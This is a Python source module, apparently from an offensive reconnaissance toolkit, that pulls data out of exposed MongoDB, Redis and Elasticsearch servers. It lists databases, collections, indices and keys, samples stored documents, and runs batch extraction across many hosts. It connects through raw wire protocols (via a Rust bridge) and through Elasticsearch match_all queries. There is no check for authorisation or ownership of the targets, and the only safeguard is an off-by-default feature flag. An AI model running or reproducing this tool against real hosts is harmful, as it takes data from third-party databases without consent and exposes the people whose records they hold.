"""
Native Database Extraction — Wire-protocol data extraction from exposed databases.

HEIST-08: Bridges the gap between open_storage_scanner (HTTP-only cloud-storage

discovery) and raw database wire protocols. After positive detection of an open
database port, this module performs structured data extraction:

  • MongoDB (27017): OP_MSG wire protocol → list DBs → collections → dump docs
  • Redis (6379): RESP2/RESP3 protocol → INFO → SCAN keys → TYPE/TTL/GET values
  • Elasticsearch (9200): HTTP REST API → _cat/indices → _search with match_all

ARCHITECTURE:
  ┌─────────────────────────────────────────────────────────────┐
  │  Python (async)                                             │
  │  extract_from_exposed(host, port, service)                  │
  │    ├── MongoDB/Redis  →  asyncio.to_thread()                │
  │    │     └── Rust native_db::{MongoDumper, RedisDumper}     │
  │    └── Elasticsearch  →  httpx (pure Python, ES is HTTP)    │
  └─────────────────────────────────────────────────────────────┘

  Rust native_db is feature-gated (Cargo.toml `native_db` feature).
  Elasticsearch extraction via HTTP works WITHOUT the Rust feature —
  zero extra dependencies, always available.

FEATURE FLAG:
  HLEDAC_ENABLE_NATIVE_EXTRACTION=1  — enables native protocol extraction
  (default: 0, opt-in SECURITY choice; Rust native_db feature must be compiled
  for MongoDB/Redis extraction. This is DISABLED by default because:
    1. Direct database connection to exposed services is a security-sensitive operation
    2. Rust native_db must be compiled with --features native_db
    3. Elasticsearch HTTP extraction works without Rust but is still gated
  For internal/CI use: set HLEDAC_ENABLE_NATIVE_EXTRACTION=1

M1 8GB SAFETY:
  • Rust: 50 MB max per extraction session (native_db.rs MAX_RESPONSE_BYTES)
  • Python ES HTTP: 100 MB max response, bounded to 10 indices × 10 docs each
  • All operations bounded by timeouts (5s connect, 30s read default)
  • asyncio.to_thread() for all blocking Rust calls — never blocks event loop
  • Fail-soft: any error → NativeExtractionResult(success=False) or None
  • Concurrency: max 5 parallel extractions (M1 8GB fetch budget)

FAIL-SAFE INVARIANTS:
  • Never raises — every public function returns None or a result Struct
  • Rust native_db ImportError → logged, returns None (graceful degradation)
  • asyncio.CancelledError re-raised for cooperative cancellation
  • Bounded memory: Rust 50MB + Python 2MB per ES response = ~60MB peak
"""

from __future__ import annotations

import asyncio
import logging
import os
from typing import Any

import msgspec
from compat.msgspec_gc_compat import Struct
from _core import aclose

logger = logging.getLogger(__name__)

# ── Constants ───────────────────────────────────────────────────────────────

_CONNECT_TIMEOUT_S: float = 5.0
_READ_TIMEOUT_S: float = 30.0
# FIX-1.5: Explicit MAX_* caps for MongoDB enumeration (was unbounded).
_MAX_MONGO_DATABASES: int = 10       # Max databases to enumerate
_MAX_MONGO_COLLECTIONS: int = 20     # Max collections per database
_DEFAULT_DOC_LIMIT: int = 500        # MongoDB documents per collection
_DEFAULT_KEY_LIMIT: int = 500       # Redis keys via SCAN
_DEFAULT_ES_SIZE: int = 100         # Elasticsearch documents per index
_MAX_ES_INDICES: int = 10           # Max indices to sample from
_MAX_ES_DOCS_PER_INDEX: int = 10    # Max docs per index
_BATCH_CONCURRENCY: int = 5         # Parallel extraction cap (M1 8GB budget)

# ── DTOs ────────────────────────────────────────────────────────────────────

class NativeExtractionResult(Struct, frozen=True):
    """Canonical result of native database extraction for a single service.

    All fields except host/port/service are optional — the struct captures
    whatever the extractor was able to retrieve before hitting a bound or error.
    """
    host: str
    port: int
    service: str  # "mongodb" | "redis" | "elasticsearch"
    success: bool
    error: str | None = None

    # MongoDB-specific
    databases: list[str] | None = None
    collections: dict[str, list[str]] | None = None   # db_name → [coll_names]
    sample_documents: list[dict[str, Any]] | None = None

    # Redis-specific
    keys: list[str] | None = None
    key_count: int | None = None
    redis_info: dict[str, str] | None = None

    # Elasticsearch-specific
    indices: list[str] | None = None
    es_documents: list[dict[str, Any]] | None = None

    # Common
    auth_required: bool | None = None
    banner: str | None = None


# ── Rust native_db bridge (lazy, zero-cost until first use) ─────────────────

_native_db_module: Any = None
_native_db_checked: bool = False


def _get_rust_native_db() -> Any | None:
    """Lazy-import Rust native_db PyO3 classes.

    The Rust native_db feature (Cargo.toml `native_db`) compiles
    MongoDumper / RedisDumper / ElasticsearchDumper PyClasses into
    the hledac_rust_extensions binary at the TOP level (not a submodule).
    This function returns a namespace object with the three dumper
    classes, or None if the feature wasn't compiled.

    Cached after first check — zero overhead on subsequent calls.
    """
    global _native_db_module, _native_db_checked
    if _native_db_checked:
        return _native_db_module
    _native_db_checked = True
    try:
        # R6: Centralized Rust access via core.rust_backend
        from hledac.universal._core.rust_backend import rust
        _rust = rust.raw.module  # type: ignore[assignment]

        MongoDumper = getattr(_rust, "MongoDumper", None)
        RedisDumper = getattr(_rust, "RedisDumper", None)
        ElasticsearchDumper = getattr(_rust, "ElasticsearchDumper", None)

        if all([MongoDumper, RedisDumper, ElasticsearchDumper]):
            # Return a lightweight namespace for ergonomic access
            from types import SimpleNamespace
            _native_db_module = SimpleNamespace(
                MongoDumper=MongoDumper,
                RedisDumper=RedisDumper,
                ElasticsearchDumper=ElasticsearchDumper,
    )
            logger.debug("Rust native_db classes loaded — MongoDB/Redis extraction available")
        else:
            missing = []
            if not MongoDumper: missing.append("MongoDumper")
            if not RedisDumper: missing.append("RedisDumper")
            if not ElasticsearchDumper: missing.append("ElasticsearchDumper")
            logger.debug(
                "Rust native_db classes missing: %s (compile with --features native_db)",
                ", ".join(missing),
    )
            _native_db_module = None
    except ImportError:
        logger.debug("hledac_rust_extensions not available (compile with --features native_db)")
        _native_db_module = None
    return _native_db_module


# ── Elasticsearch HTTP Extraction (pure Python, always available) ───────────

async def _es_extract(host: str, port: int = 9200) -> NativeExtractionResult | None:
    """Extract data from exposed Elasticsearch via HTTP REST API.

    Pure Python using httpx — Elasticsearch speaks HTTP natively on port 9200.
    No Rust dependency needed. Bounded to 10 indices × 10 documents.
    """
    try:
        from hledac.universal.network.session_runtime import async_get_httpx_session
    except Exception:
        return None

    try:
        session = await async_get_httpx_session()
        base = f"http://{host}:{port}"

        # Phase 1: List indices via _cat/indices
        async with asyncio.timeout(_READ_TIMEOUT_S):
            resp = await session.get(f"{base}/_cat/indices?format=json")
        if resp.status_code != 200:
            return NativeExtractionResult(
                host=host, port=port, service="elasticsearch",
                success=False,
                error=f"HTTP {resp.status_code}",
                auth_required=(resp.status_code in (401, 403)),
    )

        indices_data: list[dict[str, Any]] = resp.json()
        indices = [
            idx.get("index", "")
            for idx in indices_data
            if isinstance(idx, dict) and not str(idx.get("index", "")).startswith(".")
        ]

        if not indices:
            return NativeExtractionResult(
                host=host, port=port, service="elasticsearch",
                success=True, indices=[], es_documents=[],
                auth_required=False,
    )

        # Phase 2: Sample documents from each index (bounded)
        documents: list[dict[str, Any]] = []
        sampled_indices = indices[:_MAX_ES_INDICES]
        size_per_index = max(_DEFAULT_ES_SIZE // max(len(sampled_indices), 1), 1)
        size_per_index = min(size_per_index, _MAX_ES_DOCS_PER_INDEX)

        for idx in sampled_indices:
            try:
                async with asyncio.timeout(_READ_TIMEOUT_S):
                    r = await session.post(
                        f"{base}/{idx}/_search",
                        json={
                            "query": {"match_all": {}},
                            "size": size_per_index,
                            "_source": True,
                        },
    )
                if r.status_code == 200:
                    hits = r.json().get("hits", {}).get("hits", [])
                    for hit in hits:
                        if isinstance(hit, dict):
                            documents.append(hit.get("_source", {}))
            except asyncio.TimeoutError:
                continue
            except Exception:
                continue

        return NativeExtractionResult(
            host=host, port=port, service="elasticsearch",
            success=True,
            indices=indices,
            es_documents=documents,
            auth_required=False,
    )

    except asyncio.TimeoutError:
        return NativeExtractionResult(
            host=host, port=port, service="elasticsearch",
            success=False, error="timeout",
    )
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.debug(f"ES extraction failed {host}:{port}: {e}")
        return None


# ── MongoDB Extraction (Rust native_db) ─────────────────────────────────────

async def _mongo_extract(host: str, port: int = 27017) -> NativeExtractionResult | None:
    """Extract from MongoDB via Rust native_db OP_MSG wire protocol.

    Uses asyncio.to_thread() — the Rust MongoDumper methods are blocking
    (synchronous TcpStream I/O) and must run off the event loop.
    """
    native_db = _get_rust_native_db()
    if native_db is None:
        logger.debug("Rust native_db not available, skipping MongoDB extraction for %s:%d", host, port)
        return None

    try:
        dumper = native_db.MongoDumper()

        entries = await asyncio.to_thread(
            dumper.dump_all,
            host,
            port,
            _DEFAULT_DOC_LIMIT,
            _READ_TIMEOUT_S,
    )

        databases: list[str] = []
        collections: dict[str, list[str]] = {}
        documents: list[dict[str, Any]] = []
        errors: list[str] = []

        for entry in entries:
            db = entry.database
            if db and db not in databases:
                databases.append(db)
            coll = entry.collection
            if db and coll:
                collections.setdefault(db, []).append(coll)
            if entry.documents_json:
                # Bounded: max 20 documents across all collections
                if len(documents) < 20:
                    for doc_json in entry.documents_json:
                        if len(documents) >= 20:
                            break
                        try:
                            import orjson
                            documents.append(orjson.loads(doc_json))
                        except Exception:  # noqa: BLE001
                            pass
            if entry.error:
                errors.append(entry.error)

        auth_required = any(
            "auth" in e.lower() or "unauthorized" in e.lower()
            for e in errors
    )

        return NativeExtractionResult(
            host=host, port=port, service="mongodb",
            success=len(databases) > 0,
            error="; ".join(errors[:5]) if errors else None,
            databases=databases,
            collections=collections if collections else None,
            sample_documents=documents if documents else None,
            auth_required=auth_required if errors else False,
    )

    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.debug(f"MongoDB extraction failed {host}:{port}: {e}")
        return NativeExtractionResult(
            host=host, port=port, service="mongodb",
            success=False, error=str(e),
    )


# ── Redis Extraction (Rust native_db) ───────────────────────────────────────

async def _redis_extract(host: str, port: int = 6379) -> NativeExtractionResult | None:
    """Extract from Redis via Rust native_db RESP2/RESP3 protocol.

    Uses asyncio.to_thread() for blocking Rust TcpStream calls.
    """
    native_db = _get_rust_native_db()
    if native_db is None:
        logger.debug("Rust native_db not available, skipping Redis extraction for %s:%d", host, port)
        return None

    try:
        dumper = native_db.RedisDumper()

        # Phase 1: Get server INFO
        info_raw: str = await asyncio.to_thread(
            dumper.get_info, host, port, _READ_TIMEOUT_S,
    )
        info: dict[str, str] = {}
        for line in info_raw.split("\n"):
            line = line.strip()
            if line and not line.startswith("#") and ":" in line:
                k, _, v = line.partition(":")
                info[k.strip()] = v.strip()

        # Phase 2: Check auth requirement
        auth_required: bool = await asyncio.to_thread(
            dumper.check_auth, host, port, _READ_TIMEOUT_S,
    )
        if auth_required:
            return NativeExtractionResult(
                host=host, port=port, service="redis",
                success=False, auth_required=True,
                redis_info=info, error="Authentication required",
    )

        # Phase 3: Dump keys with types and values
        entries = await asyncio.to_thread(
            dumper.dump_all, host, port, _DEFAULT_KEY_LIMIT, _READ_TIMEOUT_S,
    )

        keys: list[str] = []
        for entry in entries:
            if entry.key and not entry.error:
                keys.append(entry.key)

        return NativeExtractionResult(
            host=host, port=port, service="redis",
            success=True,
            keys=keys[:_DEFAULT_KEY_LIMIT],
            key_count=len(keys),
            redis_info=info,
            auth_required=False,
    )

    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.debug(f"Redis extraction failed {host}:{port}: {e}")
        return NativeExtractionResult(
            host=host, port=port, service="redis",
            success=False, error=str(e),
    )


# ── Unified Extraction Entry Points ─────────────────────────────────────────

# Service → (extractor coroutine, default port)
_SERVICE_REGISTRY: dict[str, tuple[Any, int]] = {
    "mongodb": (_mongo_extract, 27017),
    "redis": (_redis_extract, 6379),
    "elasticsearch": (_es_extract, 9200),
}


async def extract_from_exposed(
    host: str,
    port: int | None = None,
    service: str | None = None,
    *,
    timeout_s: float = _READ_TIMEOUT_S,
) -> NativeExtractionResult | None:
    """Extract data from an exposed database service.

    The primary entry point for HEIST-08 extraction mode. Called after
    DatabasePortScanner (or similar) confirms a port is open.

    Args:
        host: Hostname or IP address of the exposed service.
        port: Port number. Auto-detected from `service` if None.
        service: One of ``"mongodb"``, ``"redis"``, ``"elasticsearch"``.
            Auto-detected from `port` if None (looks up default ports).
        timeout_s: Per-extraction timeout in seconds (default 30s).

    Returns:
        ``NativeExtractionResult`` on success, ``None`` if the service
        type cannot be determined or extraction is not possible.
        **Never raises** — all errors are captured in the result or
        logged and ``None`` returned.

    Raises:
        asyncio.CancelledError: Re-raised for cooperative cancellation.
    """
    # Auto-detect service from port
    if service is None and port is not None:
        for svc, (_, default_port) in _SERVICE_REGISTRY.items():
            if port == default_port:
                service = svc
                break

    if service is None:
        logger.debug("Cannot determine service type for %s:%s", host, port)
        return None

    entry = _SERVICE_REGISTRY.get(service)
    if entry is None:
        logger.debug("No extractor registered for service=%s", service)
        return None

    extractor, default_port = entry
    actual_port = port if port is not None else default_port

    try:
        async with asyncio.timeout(timeout_s):
            return await extractor(host, actual_port)
    except asyncio.TimeoutError:
        return NativeExtractionResult(
            host=host, port=actual_port, service=service,
            success=False, error="extraction timeout",
    )
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.debug("Extraction failed for %s at %s:%d: %s", service, host, actual_port, e)
        return None


async def extract_batch(
    targets: list[tuple[str, int, str]],
    concurrency: int = _BATCH_CONCURRENCY,
) -> list[NativeExtractionResult]:
    """Extract from multiple exposed services in parallel.

    Args:
        targets: List of ``(host, port, service)`` tuples.
        concurrency: Max concurrent extractions. M1 8GB safe default: 5.

    Returns:
        List of successful ``NativeExtractionResult`` objects.
        Failures are silently omitted (fail-soft).
    """
    from hledac.universal.utils.asyncx import parallel

    coros = [
        extract_from_exposed(host, port, service)
        for host, port, service in targets
    ]
    results = await parallel(
        coros,
        policy="collect",
        concurrency=concurrency,
        ctx="native_extraction:batch",
    )
    return [r for r in results.ok if r is not None]


# ── Feature Gate Helpers ────────────────────────────────────────────────────

def is_native_extraction_enabled() -> bool:
    """Check if native extraction is enabled via FeatureFlag registry.

    SECURITY: Default is OFF (0) — opt-in because:
    - Direct database wire protocol access to exposed services is privileged
    - Rust native_db must be compiled with --features native_db
    - Elasticsearch HTTP extraction adds connections to non-standard ports

    Set HLEDAC_ENABLE_NATIVE_EXTRACTION=1 for internal/CI deployments only.
    """
    from hledac.universal._core.feature_flags import FeatureFlag, FeatureFlags
    return FeatureFlags.get(FeatureFlag.NATIVE_EXTRACTION)


def is_rust_native_db_available() -> bool:
    """Check if Rust ``native_db`` PyO3 module is compiled and importable.

    Returns ``True`` if the Rust extension was compiled with
    ``--features native_db``, making ``MongoDumper`` / ``RedisDumper`` /
    ``ElasticsearchDumper`` available.
    """
    return _get_rust_native_db() is not None
